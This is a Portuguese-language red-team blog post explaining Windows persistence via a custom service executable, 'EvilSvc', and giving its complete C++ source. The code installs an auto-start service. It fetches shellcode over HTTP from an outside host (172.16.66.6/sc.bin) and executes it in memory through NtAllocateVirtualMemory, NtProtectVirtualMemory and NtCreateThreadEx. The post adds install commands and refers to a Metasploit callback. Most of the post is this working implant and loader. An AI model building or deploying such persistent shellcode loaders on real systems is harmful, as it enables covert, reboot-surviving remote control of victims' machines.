---
layout: post
title: service persistence 2
date: 2026-05-20
description: windows service persistence
categories: windows persistence redteam
tags: windows persistence redteam
---

* content
{:toc}






# Service Persistence 2 - custom service binary


Persistencia com service-exe customizado. Essa é a parte 2 do [service persistence](https://geleiaa.github.oi/2025/06/29/svcpersist/), nesse primeiro mostrei uma tecnica para camuflar uma dll maliciosa sendo executada pelo svchost para persistir ao reboot. Aqui vou mostrar como criar um serviço para também persistir ao reboot. A diferença é que aqui vamos criar um serviço e inserir um código próprio para executar a persistencia. Da mesma forma que a outra tecnica essa também precisa de privilegios de admin (High Mandatory Level) por causa da criação de serviço.


## Service source code

A main function chama ```StartServiceCtrlDispatcher``` que conecta no ```SCM (Service Control Manager)``` e inicia o ```control dispatcher```. O control dispatcher aguarda por instruções do SCM, dependendo da instrução essa função chama a ServiceMain ou termina a execução do programa. A StartServiceCtrlDispatcher chama a ServiceMain especificada na ```SERVICE_TABLE_ENTRY``` struct que contem o nome do service o ponteiro pra ServiceMain (de acorda com o nome dado).

Também temos um arg parse para instalar e desinstalar o service que veremos mais a diante.

```cpp
int main(int argc, char *argv[]) {
	printf("Error: no args!!!!\n");

	if (argc > 1 && strcmp(argv[1], "install") == 0) {
		InstallService();
	}
	else if (argc > 1 && strcmp(argv[1], "uninstall") == 0) {
		UninstallService();
	}
	else {

		SERVICE_TABLE_ENTRY css_DispatchTable[] = {
			{ (LPTSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain }, 
			{ NULL, NULL }
		};

		if (!StartServiceCtrlDispatcher(css_DispatchTable)) {
			return 1;
		}
	}
	
	return 0;
}
```


Na ServiceMain a primeira função que deve ser chamada é ```RegisterServiceCtrlHandler``` que registra a função "Handle" do service que vai receber as instruções do SCM e controlar os status do service. Se essa função falhar por algum motivo o service não inicia (status ```SERVICE_STOPPED```).

```cpp
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
	DWORD css_Status = E_FAIL;
	css_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
	if (!css_StatusHandle) {
		return;
	}
```

O Handle, nesse caso a função ```ServiceCtrlHandler```, recebe um "control code" para atualizar o status do service. Segundo a documentação, o Handler agir quando o control code causar alteração no status do service. 

Na função abaixo se o Handler ```SERVICE_CONTROL_STOP``` mas o status do service for ```SERVICE_RUNNING``` ele não faz nada e o service continua rodando. 

Se não o status é setado para SERVICE_STOP_PENDING, que não encerra a execução, só espera o programa ser encerrado. Quando o programa é encerrado chama ```SetEvent(css_ServiceStopEvent);``` para shutdown no service (```css_ServiceStopEvent``` é um var global usada só pra stop do service).

```cpp
VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
	switch (CtrlCode) {
	case SERVICE_CONTROL_STOP:

		if (css_ServiceStatus.dwCurrentState != SERVICE_RUNNING) {
			break;
		}

		css_ServiceStatus.dwControlsAccepted = css_ServiceStatus.dwWin32ExitCode = 0;
		css_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		css_ServiceStatus.dwCheckPoint = 4;

		if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
			return;
		}

		// This will signal the worker thread to start shutting down
		SetEvent(css_ServiceStopEvent);
		break;

	default:
		break;
	}
}
```

Voltando para ServiceMain, se o Handler for registrado com sucesso, o status é setado para ```SERVICE_START_PENDING``` para começar a inicialização do service. 

Depois chama a função ```CreateEvent()``` para sinalizar que o service pode iniciar (se a criação do evento der certo continua o fluxo) e seta o status para ```SERVICE_RUNNING``` e ```SERVICE_ACCEPT_STOP```. 

Com o service rodando inicia a função maliciosa ...

```cpp
	ZeroMemory(&css_ServiceStatus, sizeof(css_ServiceStatus));
	css_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	css_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;

	css_ServiceStatus.dwControlsAccepted = 
		css_ServiceStatus.dwWin32ExitCode = 
		css_ServiceStatus.dwServiceSpecificExitCode = 
		css_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
		return;
	}

	css_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (css_ServiceStopEvent == NULL) {
		css_ServiceStatus.dwControlsAccepted = 0;
		css_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		css_ServiceStatus.dwWin32ExitCode = GetLastError();
		css_ServiceStatus.dwCheckPoint = 1;

		if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
			return;
		}
		return;
	}

	css_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	css_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	css_ServiceStatus.dwWin32ExitCode = css_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
		return;
	}

	...
```

É aqui que vai o código malicioso, existem varias possibilidades, mas a ideia é a persistencia. Para exemplificar de forma simples vou usar o mesmo process injection de um artigo anterior.

```cpp
	//
	//ENTER CUSTOM CODE HERE
	if (!RunPayload()) {
		//Payload Execution Failed. Do Something
	}
	//

	css_ServiceStatus.dwControlsAccepted = css_ServiceStatus.dwWin32ExitCode = 0;
	css_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	css_ServiceStatus.dwCheckPoint = 3;

	if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
		return;
	}
}
```

Até aqui vimos um service basico em c++, você pode ver esse exemplo na doc oficial da microsoft [https://learn.microsoft.com/en-us/windows/win32/services/svc-cpp](https://learn.microsoft.com/en-us/windows/win32/services/svc-cpp).

A partir daqui será adicionado duas funções, um para criar/instalar e outra para deletar/desinstalar o service. Isso é uma alternativa ao ```sc.exe``` ferramenta cli para gerenciar services que geralmente é usada para criar, editar e deletar services.

Primeiro pegamos um handle para o SCM com ```OpenSCManager```, depois resolve o path atual do exe com ```GetModuleFileName``` para usar no "binpath" ao criar o service. Usando ```CreateService``` para criar o service com ```SERVICE_AUTO_START``` para start depois do boot, e por fim ```StartService``` inicia o service.

Para deletar o service o processo é o mesmo, page o handle para SCM, openservice e deleteservice.

```cpp
void InstallService() {
	SC_HANDLE ServiceControlManager = OpenSCManager(0, 0, SC_MANAGER_CREATE_SERVICE);
	if (ServiceControlManager) {
		TCHAR path[_MAX_PATH + 1];
		if (GetModuleFileName(0, path, sizeof(path) / sizeof(path[0])) > 0) {
			SC_HANDLE service = CreateService(ServiceControlManager, SERVICE_NAME, SERVICE_NAME, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path, 0, 0, 0, 0, 0);
			if (!StartService(service, NULL, NULL)) {
				return;
			}
		}
		CloseServiceHandle(ServiceControlManager);
	}
}


void UninstallService() {
	SC_HANDLE ServiceControlManager = OpenSCManager(0, 0, SC_MANAGER_CREATE_SERVICE);

	if (ServiceControlManager) {
		SC_HANDLE service = OpenService(ServiceControlManager, SERVICE_NAME, SERVICE_QUERY_STATUS | DELETE);
		if (service) {
			SERVICE_STATUS serviceStatus;
			if (QueryServiceStatus(service, &serviceStatus)) {
				if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
					DeleteService(service);
			}
			CloseServiceHandle(service);
		}
		CloseServiceHandle(ServiceControlManager);
	}
}
```

## Usage

- Install ou Uninstall

```sh
> service.exe install

> service.exe uninstall
```

- Criar service com sc.exe

```sc.exe create <SVC_NAME> binpath=/path/to/service.exe displayname= <DISPLAYNAME> start=auto ```


## POC

#### criando e startando service

- Rodando com admin perm

![createsvc](/img/createsvc1.png)


- Se tentar parar o service enquanto o exe esta rodando não funciona, o service só para quando encerra o exe

![stopsvc](/img/stopsvc1.png)


- msf callback

![msf1](/img/msf1.png)


![msf2](/img/msf2.png)


## Full source

```cpp
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <winhttp.h>
#include <string.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

#define DEFAULT_BUFLEN 4096
#define SERVICE_NAME TEXT("EvilSvc")

SERVICE_STATUS css_ServiceStatus;
SERVICE_STATUS_HANDLE css_StatusHandle;
HANDLE css_ServiceStopEvent = NULL;

#define NtCurrentProcess()         ((HANDLE)-1)

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtCreateThreadEx(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
);


int RunPayload(char* sc, DWORD scLen) {
	
	PVOID BaseAddress = NULL;
	SIZE_T dwSize = 0x2000;
	PCSTR Terminator = NULL;
	NTSTATUS STATUS;
	HANDLE hThread;
	DWORD OldProtect = 0;

	NTSTATUS status1 = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status1)) {
		return 1;
	}

	RtlMoveMemory(BaseAddress, sc, scLen);

	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		return 1;
	}

	HANDLE hHostThread = INVALID_HANDLE_VALUE;


	NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(NtCreateThreadstatus)) {
		return 1;
	}

	WaitForSingleObject(hHostThread, -1);

	return 0;

}

int getShellcode_Run() {

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer = NULL;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession)
		hConnect = WinHttpConnect(hSession, L"172.16.66.6",
			INTERNET_DEFAULT_HTTP_PORT, 0);

	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/sc.bin",
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			NULL);

	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);

	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	if (bResults)
	{
		do
		{
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());

			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				dwSize = 0;
			}
			else
			{
				ZeroMemory(pszOutBuffer, dwSize + 1);

				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
					dwSize, &dwDownloaded))
					printf("Error %u in WinHttpReadData.\n", GetLastError());
				else
					printf("%s", pszOutBuffer);

				RunPayload(pszOutBuffer, dwSize + 1);

			}
		} while (dwSize > 0);
	}


	if (!bResults)
		printf("Error %d has occurred.\n", GetLastError());

	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return 0;
}

int callFuncs() {

	if (!getShellcode_Run()){
		return 1;
	}

	return 0;
}


VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
	switch (CtrlCode) {
	case SERVICE_CONTROL_STOP:

		if (css_ServiceStatus.dwCurrentState != SERVICE_RUNNING) {
			break;
		}

		css_ServiceStatus.dwControlsAccepted = css_ServiceStatus.dwWin32ExitCode = 0;
		css_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		css_ServiceStatus.dwCheckPoint = 4;

		if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
			return;
		}

		SetEvent(css_ServiceStopEvent);
		break;

	default:
		break;
	}
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
	DWORD css_Status = E_FAIL;
	css_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
	if (!css_StatusHandle) {
		return;
	}

	ZeroMemory(&css_ServiceStatus, sizeof(css_ServiceStatus));
	css_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	css_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;

	css_ServiceStatus.dwControlsAccepted = 
		css_ServiceStatus.dwWin32ExitCode = 
		css_ServiceStatus.dwServiceSpecificExitCode = 
		css_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
		return;
	}

	css_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (css_ServiceStopEvent == NULL) {
		css_ServiceStatus.dwControlsAccepted = 0;
		css_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		css_ServiceStatus.dwWin32ExitCode = GetLastError();
		css_ServiceStatus.dwCheckPoint = 1;

		if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
			return;
		}
		return;
	}

	css_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	css_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	css_ServiceStatus.dwWin32ExitCode = css_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
		return;
	}
	
	//ENTER CUSTOM CODE HERE
	callFuncs();
	
	css_ServiceStatus.dwControlsAccepted = css_ServiceStatus.dwWin32ExitCode = 0;
	css_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	css_ServiceStatus.dwCheckPoint = 3;

	if (SetServiceStatus(css_StatusHandle, &css_ServiceStatus) == FALSE) {
		return;
	}
}

void InstallService() {
	SC_HANDLE ServiceControlManager = OpenSCManager(0, 0, SC_MANAGER_CREATE_SERVICE);
	if (ServiceControlManager) {
		TCHAR path[_MAX_PATH + 1];
		if (GetModuleFileName(0, path, sizeof(path) / sizeof(path[0])) > 0) {
			SC_HANDLE service = CreateService(ServiceControlManager, SERVICE_NAME, SERVICE_NAME, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path, 0, 0, 0, 0, 0);
			if (!StartService(service, NULL, NULL)) {
				return;
			}
		}
		CloseServiceHandle(ServiceControlManager);
	}
}


void UninstallService() {
	SC_HANDLE ServiceControlManager = OpenSCManager(0, 0, SC_MANAGER_CREATE_SERVICE);

	if (ServiceControlManager) {
		SC_HANDLE service = OpenService(ServiceControlManager, SERVICE_NAME, SERVICE_QUERY_STATUS | DELETE);
		if (service) {
			SERVICE_STATUS serviceStatus;
			if (QueryServiceStatus(service, &serviceStatus)) {
				if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
					DeleteService(service);
			}
			CloseServiceHandle(service);
		}
		CloseServiceHandle(ServiceControlManager);
	}
}


int main(int argc, char *argv[]) {
	printf("Error: no args!!!!\n");

	if (argc > 1 && strcmp(argv[1], "install") == 0) {
		InstallService();
	}
	else if (argc > 1 && strcmp(argv[1], "uninstall") == 0) {
		UninstallService();
	}
	else {

		SERVICE_TABLE_ENTRY css_DispatchTable[] = {
			{ (LPTSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain }, 
			{ NULL, NULL }
		};

		if (!StartServiceCtrlDispatcher(css_DispatchTable)) {
			return 1;
		}
	}
	
	return 0;
}
```


